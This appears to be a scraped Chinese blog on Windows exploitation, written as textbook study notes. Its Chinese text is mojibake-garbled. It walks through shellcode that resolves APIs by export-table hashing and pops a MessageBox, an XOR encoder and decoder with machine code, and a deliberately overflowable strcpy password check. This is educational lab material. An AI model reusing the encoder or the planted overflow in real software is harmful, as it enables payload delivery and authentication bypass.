<h5 id="åº“å‡½æ•°è¡¨æŒ‡é’ˆåç§»ä¸€ä¸ªå•ä½"><a href="#åº“å‡½æ•°è¡¨æŒ‡é’ˆåç§»ä¸€ä¸ªå•ä½" class="headerlink" title="åº“å‡½æ•°è¡¨æŒ‡é’ˆåç§»ä¸€ä¸ªå•ä½"></a>åº“å‡½æ•°è¡¨æŒ‡é’ˆåç§»ä¸€ä¸ªå•ä½</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">next_function_loop: </span><br><span class="line">	inc edi 					; increment function counter </span><br><span class="line">	mov esi, [ebx + edi * 4] 	; esi = relative offset of current function name </span><br><span class="line">	add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">	cdq 						; dl will hold hash (we know eax is small) </span><br></pre></td></tr></table></figure>

<p>ediä½œä¸ºä¸‹æ ‡,ebxæ˜¯å‡½æ•°åè¡¨çš„åŸºåœ°å€,</p>
<p>[ebx+edi*4]æ˜¯ä¸€ä¸ªåŸºå€å˜å€å¯»å€,ç›¸å½“äºè®¿é—®æ•°ç»„,æ•°ç»„çš„æ¯ä¸ªå…ƒç´ éƒ½æ˜¯4å­—èŠ‚çš„</p>
<p>æ˜¾ç„¶å‡½æ•°åè¡¨çš„æ¯ä¸ªè¡¨é¡¹éƒ½æ˜¯4å­—èŠ‚çš„å­—ç¬¦ä¸²æŒ‡é’ˆ,</p>
<p>mov esi, [ebx + edi * 4]ç›¸å½“äºæŠŠä¸€ä¸ªåº“å‡½æ•°åæŒ‡é’ˆç›¸å¯¹Kernel32.dllçš„åç§»é‡æ”¾åˆ°esiä¸Šäº†</p>
<p>ç„¶ååŠ ä¸Šebp(kernel32.dllæ˜ åƒåŸºå€),å°±å¾—åˆ°äº†åº“å‡½æ•°åæŒ‡é’ˆçš„ç»å¯¹åœ°å€</p>
<p>cdqçš„ä½œç”¨æ˜¯eaxæœ‰ç¬¦å·æ‹“å±•åˆ°edx:eax</p>
<h5 id="è®¡ç®—ä¸€ä¸ªåº“å‡½æ•°åçš„æ‘˜è¦"><a href="#è®¡ç®—ä¸€ä¸ªåº“å‡½æ•°åçš„æ‘˜è¦" class="headerlink" title="è®¡ç®—ä¸€ä¸ªåº“å‡½æ•°åçš„æ‘˜è¦"></a>è®¡ç®—ä¸€ä¸ªåº“å‡½æ•°åçš„æ‘˜è¦</h5><p>è¿™å°±æ˜¯GetHashå‡½æ•°çš„æ±‡ç¼–ç‰ˆæœ¬</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hash_loop: </span><br><span class="line">	movsx eax, byte ptr[esi]</span><br><span class="line">	cmp al,ah</span><br><span class="line">	jz compare_hash</span><br><span class="line">	ror edx,7</span><br><span class="line">	add edx,eax</span><br><span class="line">	inc esi</span><br><span class="line">	jmp hash_loop</span><br></pre></td></tr></table></figure>

<p>esiæ˜¯åº“å‡½æ•°åæŒ‡é’ˆ,å–å‡ºä¸€ä¸ªå­—èŠ‚è§£å¼•ç”¨åå¸¦ç¬¦å·æ‹“å±•åˆ°eaxä¸Š</p>
<p>å¦‚æœalå’Œahç›¸ç­‰,è¯´æ˜eax&#x3D;0,å³å·²ç»æ‰«æåˆ°è¿™ä¸ªå­—ç¬¦ä¸²çš„â€™\0â€™,åº”è¯¥ç»“æŸäº†,è·³è½¬compare_hashè¿›è¡Œæ¯”è¾ƒ</p>
<p>å¦åˆ™è¯¥å­—ç¬¦ä¸²è¿˜æ²¡æœ‰ç»“æŸ,ç»§ç»­å–å€¼ç›´åˆ°al&#x3D;ah</p>
<h5 id="æ¯”è¾ƒæ‘˜è¦å€¼"><a href="#æ¯”è¾ƒæ‘˜è¦å€¼" class="headerlink" title="æ¯”è¾ƒæ‘˜è¦å€¼"></a>æ¯”è¾ƒæ‘˜è¦å€¼</h5><p>åˆ°è¾¾è¿™ä¸€æ­¥çš„æ—¶å€™,æ˜¯hash_loopsè®¡ç®—å®Œåº“å‡½æ•°åçš„æ‘˜è¦å€¼äº†,ç»“æœæ”¾åˆ°äº†edxä¸Š</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">compare_hash:	</span><br><span class="line">	cmp edx, [esp + 0x1c] 		; compare to the requested hash (saved on stack from pushad) </span><br><span class="line">	jnz next_function_loop </span><br></pre></td></tr></table></figure>

<p>esp+0x1CæŒ‡å‘è°å‘¢?ä¿å­˜çš„æˆ‘ä»¬å¸Œæœ›å¯»æ‰¾çš„æ‘˜è¦å€¼</p>
<p>[esp+0x1C]è§£å¼•ç”¨,å°†å¸Œæœ›å¯»æ‰¾çš„æ‘˜è¦å€¼å’Œedxè¿›è¡Œæ¯”è¾ƒ,å¦‚æœä¸º0è¯´æ˜æ‰¾åˆ°äº†,ä¸ç”¨è·³è½¬,å¦åˆ™æ²¡æ‰¾åˆ°å°±å¾—é‡å¤next_function_loopè®¡ç®—ä¸‹ä¸€ä¸ªåº“å‡½æ•°çš„æ‘˜è¦å’Œå¸Œæœ›çš„æ‘˜è¦è¿›è¡Œæ¯”è¾ƒ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220917195103779.png"></p>
<h5 id="å¦‚æœåŒ¹é…"><a href="#å¦‚æœåŒ¹é…" class="headerlink" title="å¦‚æœåŒ¹é…"></a>å¦‚æœåŒ¹é…</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov ebx, [ecx + 0x24] 		; ebx = relative offset of ordinals table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">mov di, [ebx + 2 * edi] 	; di = ordinal number of matched function </span><br><span class="line">mov ebx, [ecx + 0x1c] 		; ebx = relative offset of address table </span><br><span class="line">add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">add ebp, [ebx + 4 * edi] 	; add to ebp (base addr of module) the </span><br><span class="line">							; relative offset of matched function </span><br><span class="line">xchg eax, ebp 				; move func addr into eax </span><br><span class="line">pop edi 					; edi is last onto stack in pushad </span><br><span class="line">stosd 						; write function addr to [edi] and increment edi </span><br><span class="line">push edi </span><br><span class="line">popad					; restore registers </span><br><span class="line">		 				; loop until we reach end of last hash </span><br><span class="line">cmp eax,0x1e380a6a</span><br><span class="line">jne find_lib_functions </span><br></pre></td></tr></table></figure>

<p>ç”¨åå­—è¡¨çš„ä¸‹æ ‡æŸ¥åºå·è¡¨,å†ç”¨åºå·è¡¨ç›¸åº”å€¼ä½œä¸ºä¸‹æ ‡æŸ¥å¯¼å‡ºå‡½æ•°åœ°å€è¡¨,ç„¶åæŠŠåœ°å€æ”¾åˆ°eax,å†™åˆ°ediæŒ‡å‘çš„åœ°å€ä¸Š</p>
<p>å½“eax&#x3D;0x1e280a6a,å³MessageBoxAçš„æ‘˜è¦æ—¶,è¯´æ˜æ‰€æœ‰å‡½æ•°çš„åœ°å€éƒ½æŸ¥å®Œäº†å¹¶ä¸”å†™å¥½äº†</p>
<p>å¦åˆ™è¿˜æœ‰å‡½æ•°æ²¡æœ‰è§£æåœ°å€,è‡³å°‘MessageBoxAæ²¡æœ‰,è·³è½¬find_lib_functionså¤–åœˆå¤§å¾ªç¯,å¯»æ‰¾ä¸‹ä¸€ä¸ªå¸Œæœ›çš„æ‘˜è¦å€¼å¯¹åº”å‡½æ•°çš„åœ°å€</p>
<h4 id="è°ƒç”¨å‡½æ•°"><a href="#è°ƒç”¨å‡½æ•°" class="headerlink" title="è°ƒç”¨å‡½æ•°"></a>è°ƒç”¨å‡½æ•°</h4><p>æ‰§è¡Œåˆ°è¿™é‡Œ,æ‰€æœ‰å‡½æ•°éƒ½å·²ç»è§£æå®Œæ¯•,ä¸‹é¢å°±è¦è°ƒç”¨çª—å£å¹¶ä¸”exit(0)è¿”å›äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function_call:</span><br><span class="line">	xor ebx,ebx</span><br><span class="line">	push ebx			// cut string</span><br><span class="line">	push 0x74736577</span><br><span class="line">	push 0x6C696166		//push failwest</span><br><span class="line">	mov eax,esp			//load address of failwest</span><br><span class="line">	push ebx	</span><br><span class="line">	push eax</span><br><span class="line">	push eax</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x04] ; //call MessageboxA</span><br><span class="line">	push ebx</span><br><span class="line">	call [edi - 0x08] ; // call ExitProcess</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br><span class="line">	nop</span><br></pre></td></tr></table></figure>





<h2 id="shellcodeåŠ å£³"><a href="#shellcodeåŠ å£³" class="headerlink" title="shellcodeåŠ å£³"></a>shellcodeåŠ å£³</h2><p>shellcodeåŠ å£³,å…¶ç›®çš„è¦ä¹ˆæ˜¯æ¶ˆå»å…¶ä¸­çš„00å­—èŠ‚,ä½¿å¾—æ•´ä¸ªshellcodeå¯ä»¥è¢«ä¸²æ‹·è´è¿›å…¥ç¼“å†²åŒº,é˜²æ­¢æˆªæ–­</p>
<p>å¹¶ä¸”è¿˜å¯èƒ½ç»•è¿‡å®‰å…¨æ£€æŸ¥?</p>
<p>ä¹¦ä¸Šç»™å‡ºçš„åŠ å£³å‡½æ•°decode,ä½¿ç”¨key&#x3D;0x44å¯¹inputå­—ç¬¦ä¸²è¿›è¡Œå¼‚æˆ–åŠ å¯†,inputçš„é€ä¸ªå­—èŠ‚éƒ½å’Œkeyè¿›è¡Œå¼‚æˆ–,ç»“æœå†™å…¥encode.txt</p>
<p>è§£ç å™¨æ˜¯è¿™æ ·å†™çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">			add eax, 0x14 //locate the real start of shellcode</span><br><span class="line">			xor ecx,ecx</span><br><span class="line">decode_loop:</span><br><span class="line">			mov bl,[eax+ecx]</span><br><span class="line">			xor bl, 0x44 //key,should be changed to decode </span><br><span class="line">			mov [eax+ecx],bl</span><br><span class="line">			</span><br><span class="line">			inc ecx</span><br><span class="line">			cmp bl,0x90 // assume 0x90 as the end mark of shellcode </span><br><span class="line">			jne decode_loop</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹eaxå¢åŠ 20ä¸ªå­—èŠ‚,æ­£å¥½è·³è¿‡è§£ç å™¨</p>
<blockquote>
<p>è§£ç å™¨ç¼–è¯‘ä¹‹åç”Ÿæˆçš„æœºå™¨ç </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">83 C0 14 33 C9 8A 1C 08 80 F3 44 88 1C 08 41 80</span><br><span class="line">FB 90 75 F1</span><br></pre></td></tr></table></figure>
</blockquote>
<p>ecxä¸€å¼€å§‹ç½®é›¶,åæ¥[eax+ecx]æ˜¯ä¸€ä¸ªåŸºå€ç¼–å€å¯»å€,eaxæ˜¯åŸºå€,å³shellcodeçš„åŸºåœ°å€,ecxæ˜¯åç§»é‡,ecxä¼šéå†shellcodeåŒºåŸŸ.å½“è§£ç å‡º0x90æ—¶,æ„å‘³ç€shellcodeåˆ°å¤´äº†(æˆ‘ä»¬è‡ªå·±è§„å®šçš„shellcodeæœ€åä»¥0x90ç»“å°¾),æ­¤æ—¶ä¸å†é‡å¤decode_loop,æ§åˆ¶è‡ªç„¶é¡ºåºè½¬ç§»ç»™shellcodeçš„èµ·å§‹ä½ç½®</p>
<p>å¦åˆ™,å³å°šæœªè§£ç å‡º0x90,åˆ™shellcodeè¿˜æ²¡æœ‰å®Œå…¨è§£å¯†,é‡å¤decode_loop</p>
<p>å°†è§£ç å™¨çš„æœºå™¨ç æ”¾åˆ°shellcodeä¹‹å‰,ç„¶åå°†æ•´ä½“æ”¾åˆ°å­—ç¬¦æ•°ç»„é‡Œä¸¢åˆ°è°ƒè¯•ç¯å¢ƒé‡Œå°±å¯ä»¥å¼¹çª—äº†</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/17/windowsROP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/17/windowsROP/" class="post-title-link" itemprop="url">windowsåˆçº§ROP</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-17 00:59:00" itemprop="dateCreated datePublished" datetime="2022-09-17T00:59:00+08:00">2022-09-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-09-18 20:34:34" itemprop="dateModified" datetime="2022-09-18T20:34:34+08:00">2022-09-18</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windowsåˆçº§ROP"><a href="#windowsåˆçº§ROP" class="headerlink" title="windowsåˆçº§ROP"></a>windowsåˆçº§ROP</h1><h2 id="å·¥å…·"><a href="#å·¥å…·" class="headerlink" title="å·¥å…·"></a>å·¥å…·</h2><h3 id="VC-6-0"><a href="#VC-6-0" class="headerlink" title="VC++6.0"></a>VC++6.0</h3><p>é“¾æ¥ï¼š<a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1jfAzvMvi27zPeiSGNTouQA">https://pan.baidu.com/s/1jfAzvMvi27zPeiSGNTouQA</a><br>æå–ç ï¼šdust</p>
<p>è€å¤è‘£äº†</p>
<p>å½“ç¼–è¯‘é“¾æ¥æŠ¥é”™çš„æ—¶å€™è¯•è¯•ç¦ç”¨é¢„ç¼–è¯‘å¤´,åæœ‰å…«ä¹æ˜¯ä»–å¯¼è‡´çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916203740037.png" alt="image-20220916203740037"></p>
<h3 id="windows-XPæ“ä½œç³»ç»Ÿ"><a href="#windows-XPæ“ä½œç³»ç»Ÿ" class="headerlink" title="windows XPæ“ä½œç³»ç»Ÿ"></a>windows XPæ“ä½œç³»ç»Ÿ</h3><p>å»<a target="_blank" rel="noopener" href="https://msdn.itellyou.cn/">MSDN, æˆ‘å‘Šè¯‰ä½  - åšä¸€ä¸ªå®‰é™çš„å·¥å…·ç«™ (itellyou.cn)</a>è¿™é‡Œæ‰¾</p>
<p>å®é™…åœ¨windows11ä¸Šç”¨VC++6.0ä¹Ÿå¯ä»¥åšå®éªŒ,å¹¶ä¸”æ¯”å¤è‘£XPæ›´æ–¹ä¾¿</p>
<h2 id="ç¼“å†²åŒºæº¢å‡ºä¿®æ”¹ä¸´è¿‘å˜é‡"><a href="#ç¼“å†²åŒºæº¢å‡ºä¿®æ”¹ä¸´è¿‘å˜é‡" class="headerlink" title="ç¼“å†²åŒºæº¢å‡ºä¿®æ”¹ä¸´è¿‘å˜é‡"></a>ç¼“å†²åŒºæº¢å‡ºä¿®æ”¹ä¸´è¿‘å˜é‡</h2><p>ä¹¦ä¸Šç»™å‡ºçš„ä¾‹ç¨‹é•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PASSWORD <span class="string">&quot;1234567&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">verify_password</span><span class="params">(<span class="type">char</span> *password)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> authenticated;</span><br><span class="line">    <span class="type">char</span> buffer[<span class="number">8</span>]; <span class="comment">// add local buffto be overflowed</span></span><br><span class="line">    authenticated = <span class="built_in">strcmp</span>(password, PASSWORD);</span><br><span class="line">    <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line">    <span class="keyword">return</span> authenticated;</span><br><span class="line">&#125;</span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> valid_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> password[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;please input password: &quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, password);</span><br><span class="line">        valid_flag = verify_password(password);</span><br><span class="line">        <span class="keyword">if</span> (valid_flag)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;incorrect password!\n\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;Congratulation! You have passed the verification!\n&quot;</span>); </span><br><span class="line"> <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>VC++6.0çš„è¯­æ³•,å…³äºmainå‡½æ•°ä¸ºå•¥æ²¡æœ‰è¿”å›å€¼ç±»å‹,å…¥ä¹¡éšä¿—å§</p>
</blockquote>
<p>ä¸»å‡½æ•°é‡Œé¢ä¸€ä¸ª1Kå­—èŠ‚çš„passwordåºç„¶å¤§ç‰©,å…¶åŸºåœ°å€ä¼ é€’ç»™verify_passwordå‡½æ•°</p>
<p>è¯¥å‡½æ•°ç”¨äº†ä¸€ä¸ªauthenticatedå˜é‡æ‰¿è½½strcmpçš„è¿”å›å€¼,å¦‚æœè¾“å…¥çš„å¯†ç æ­£ç¡®,å³password&#x3D;1234567,åˆ™strcmp(buffer,password)è¿”å›0,authenticated&#x3D;0.å¦åˆ™strcmpæ ¹æ®ä¸¤ä¸ªå‚æ•°çš„å­—å…¸åºè¿”å›æ­£æ•°æˆ–è€…è´Ÿæ•°</p>
<p>ä¸ºäº†æ•…æ„åˆ¶é€ æ¼æ´,ä¹¦ä¸Šåœ¨strcmpå‡½æ•°è°ƒç”¨ç»“æŸä¹‹åç”¨strcmpå°†passwordæ‹·è´åˆ°bufferä¸Šäº†strcpy(buffer, password); </p>
<p>ä¸‹é¢åŠ¨æ€è°ƒè¯•verify_passwordå‡½æ•°,è§‚å¯Ÿå…¶æ ˆå¸§çš„åˆ†å¸ƒ</p>
<p>ç”¨ollydbg,VC++6.0,idaç­‰ç­‰è°ƒè¯•å‡å¯</p>
<h3 id="å¼€ç«¯"><a href="#å¼€ç«¯" class="headerlink" title="å¼€ç«¯"></a>å¼€ç«¯</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">5:    int verify_password(char *password)</span><br><span class="line">6:    &#123;</span><br><span class="line">00401020   push        ebp	;ä¿å­˜è°ƒç”¨è€…å¸§æŒ‡é’ˆ,è¿”å›æ—¶å®ç°å †æ ˆå¹³è¡¡</span><br><span class="line">00401021   mov         ebp,esp;ebpæŒ‡å‘å½“å‰å‡½æ•°æ ˆå¸§åº•éƒ¨</span><br><span class="line">00401023   sub         esp,4Ch;æ ˆé¡¶ä¸‹é™0x4C</span><br><span class="line">00401026   push        ebx;è¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨</span><br><span class="line">00401027   push        esi</span><br><span class="line">00401028   push        edi</span><br><span class="line">00401029   lea         edi,[ebp-4Ch]</span><br><span class="line">0040102C   mov         ecx,13h</span><br><span class="line">00401031   mov         eax,0CCCCCCCCh</span><br><span class="line">00401036   rep stos    dword ptr [edi];å°†eaxçš„å€¼æ‹·è´åˆ°ediæŒ‡å‘çš„å­—ç¬¦ä¸²,é‡å¤æ¬¡æ•°ecx=0x13æ¬¡</span><br></pre></td></tr></table></figure>

<h3 id="å£°æ˜ä¸¤ä¸ªå±€éƒ¨å˜é‡"><a href="#å£°æ˜ä¸¤ä¸ªå±€éƒ¨å˜é‡" class="headerlink" title="å£°æ˜ä¸¤ä¸ªå±€éƒ¨å˜é‡"></a>å£°æ˜ä¸¤ä¸ªå±€éƒ¨å˜é‡</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>:        <span class="type">int</span> authenticated;</span><br><span class="line"><span class="number">8</span>:        <span class="type">char</span> buffer[<span class="number">8</span>]; <span class="comment">// add local buffto be overflowed</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤,è¿™æ˜¯å› ä¸ºç¼–è¯‘åŸç†ä¸­,å£°æ˜è¯­å¥ä¸ç”Ÿæˆå¯æ‰§è¡Œä»£ç ,åªæ˜¯èµ·åˆ°è§„å®šç¬¦å·ç±»å‹çš„ä½œç”¨</p>
<h3 id="è°ƒç”¨strcmpè®¡ç®—authenticated"><a href="#è°ƒç”¨strcmpè®¡ç®—authenticated" class="headerlink" title="è°ƒç”¨strcmpè®¡ç®—authenticated"></a>è°ƒç”¨strcmpè®¡ç®—authenticated</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">9:        authenticated = strcmp(password, PASSWORD);</span><br><span class="line">00401038   push        offset string &quot;1234567&quot; (0042501c)</span><br><span class="line">0040103D   mov         eax,dword ptr [ebp+8]</span><br><span class="line">00401040   push        eax</span><br><span class="line">00401041   call        strcmp (00401250)</span><br><span class="line">00401046   add         esp,8</span><br><span class="line">00401049   mov         dword ptr [ebp-4],eax</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªstrcmpèµ·åˆ°äº†éªŒè¯è¾“å…¥å¯†ç æ˜¯å¦æ­£ç¡®çš„ä½œç”¨</p>
<p>stdcallè°ƒç”¨çº¦å®š,ä½¿ç”¨æ ˆä¼ é€’å‚æ•°,æœ€å…ˆpushå…¥æ ˆçš„â€1234567â€çš„åœ°å€ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°,åæ¥è¿pushå…¥æ ˆçš„ebp+8ä½œä¸ºç¬¬ä¸€ä¸ªå‚æ•°</p>
<p>å±€éƒ¨å˜é‡éƒ½æ˜¯åœ¨æœ¬å‡½æ•°æ ˆå¸§å†…éƒ¨çš„,ä»–ä»¬åœ¨æ ˆä¸­çš„åœ°å€æ€»æ˜¯ebpå‡å»æŸä¸ªæ•°,è€Œç°åœ¨ebp+8è¿™ä¸ªåœ°å€æ˜¾ç„¶ä¸æ˜¯å½“å‰å‡½æ•°æ ˆå†…çš„å±€éƒ¨å˜é‡,æ˜¯è°ƒç”¨è€…å‹æ ˆä¼ é€’çš„å‚æ•°password</p>
<p>strcmpè°ƒç”¨è¿”å›ä¹‹åç«‹åˆ»æŠ¬æ ˆ8ä¸ªå­—èŠ‚,è¿™å°±æ¶ˆå»äº†ä¸ºäº†è°ƒç”¨strcmpå‹å…¥çš„ä¸¤ä¸ªå‚æ•°,è°ƒç”¨strcmpå‰åå †æ ˆå¹³è¡¡</p>
<p>stdcallä¸­,strcmpè¿”å›å€¼æ”¾åœ¨eaxå¯„å­˜å™¨ä¸­,æ‹·è´åˆ°æ ˆä¸Šebp-4ä½ç½®,è¿™æ„å‘³ç€ebp-4æ˜¯authenticatedçš„ä½ç½®,å®ƒç´§æŒ¨ç€æ ˆåº•</p>
<h3 id="ç”»è›‡æ·»è¶³é€ æˆæ¼æ´"><a href="#ç”»è›‡æ·»è¶³é€ æˆæ¼æ´" class="headerlink" title="ç”»è›‡æ·»è¶³é€ æˆæ¼æ´"></a>ç”»è›‡æ·»è¶³é€ æˆæ¼æ´</h3><p>åˆ°äº†æ•…æ„å†™ä¸Šçš„strcpyäº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">10</span>:       <span class="built_in">strcpy</span>(buffer, password); <span class="comment">// over flowed here!</span></span><br><span class="line"><span class="number">0040104</span>C   mov         ecx,dword ptr [ebp+<span class="number">8</span>]</span><br><span class="line"><span class="number">0040104F</span>   push        ecx</span><br><span class="line"><span class="number">00401050</span>   lea         edx,[ebp<span class="number">-0</span>Ch]</span><br><span class="line"><span class="number">00401053</span>   push        edx</span><br><span class="line"><span class="number">00401054</span>   call        <span class="title function_">strcpy</span> <span class="params">(<span class="number">00401160</span>)</span></span><br><span class="line">00401059   add         esp,8</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ebp+8æŒ‡å‘è°ƒç”¨è€…å‹å…¥çš„passwordå­—ç¬¦ä¸²åœ°å€</p>
<p>ebp-0xCçœ‹æ¥å°±æ˜¯bufferçš„åŸºåœ°å€äº†</p>
<p>ç„¶åè°ƒç”¨strcpyä»ebp+8æ‹·è´å­—ç¬¦ä¸²åˆ°ebp-0xC,å•¥æ—¶å€™ç¢°åˆ°â€™\0â€™å­—ç¬¦,å•¥æ—¶å€™æ‹·è´ç»“æŸ</p>
<p>è°ƒç”¨å®ŒæˆåæŠ¬æ ˆ8ä¸ªå­—èŠ‚,å®ç°strcpyå‰åå †æ ˆå¹³è¡¡</p>
<p>åˆ°æ­¤å¯ä»¥ç”»å‡ºverify_passwordçš„æ ˆå¸§åˆ†å¸ƒäº†</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220916164950680.png" alt="image-20220916164950680"></p>
<p>bufferçš„é•¿åº¦ä¸º8,å¦‚æœè¾“å…¥8ä¸ªå­—ç¬¦,æ­£å¥½å¡«æ»¡buffer,è¿˜å¤šå‡ºä¸€ä¸ªâ€™\0â€™ç»“æŸå­—ç¬¦,ä¸å¾—ä¸æ”¾åˆ°authenticatedä¸Šäº†,è¿™å°±æº¢å‡ºè¦†ç›–äº†</p>
<p>ç„¶åauthenticatedè¢«è¿”å›</p>
<p>è€Œmainå‡½æ•°ä¸­å°±æ˜¯å‡­verify_passwordçš„è¿”å›å€¼å†³å®šæ˜¯å¦è¾“å…¥äº†æ­£ç¡®çš„å¯†ç </p>
<p>è¿™é‡Œéœ€è¦è®©valid_flagå³verify_passwordçš„è¿”å›å€¼ä¸º0æ‰å¯ä»¥è·³è¿‡if,è¿›å…¥else</p>
